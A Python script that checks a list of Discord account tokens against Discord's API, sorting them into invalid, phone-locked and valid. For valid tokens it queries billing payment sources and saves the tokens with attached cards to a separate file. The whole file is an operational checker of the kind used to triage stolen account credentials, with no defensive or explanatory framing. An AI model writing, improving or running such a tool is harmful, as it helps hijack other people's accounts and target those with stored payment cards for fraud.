from requests import get, post
from random import randint
import os
import requests
import time
from json import loads, dumps
from urllib.request import Request, urlopen
from requests import get, post
from random import randint
import os
tokens = ''
paymentskolvo = 0
a = 0
b = 0
c = 0

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

payments = 'False'
checks = input("input tokens into tokens.txt and press enter")
if checks == 'y' or "Y":
    file1 = open("tokens.txt", "r")
    while True:

        line = file1.readline()

        if not line:
            break

        tokens = line.strip()
        response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}',
                                headers={'Authorization': tokens})
        if response.status_code == 401:
            a += 1
            print(f'{tokens} | Invalid token')

        elif "You need to verify your account in order to perform this action." in str(response.content):
            c += 1
            print(f'{tokens} | Phone locked token')
        else:
            cards = bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                               headers=getHeader(tokens))).read().decode())) > 0)
            if cards is True:
                b += 1
                paymentskolvo += 1
                print(f'{tokens} | Valid token with payment-sources')
                f = open('cardtokens.txt', 'a')
                f.write(f"{tokens}\n")
            else:
                b += 1
                print(f'{tokens} | Valid token without payment-sources')
                f = open('valid.txt', 'a')
                f.write(f"{tokens}\n")
            os.system("cls")
    print(f'''
Valid: {b}. Phone locked: {c}. Invalid: {a}. With payment-sources: {paymentskolvo}.
Valid without payment-sources tokens saved in valid.txt.
Valid with payment-sources tokens saved in cardtokens.txt.
          ''')
input()
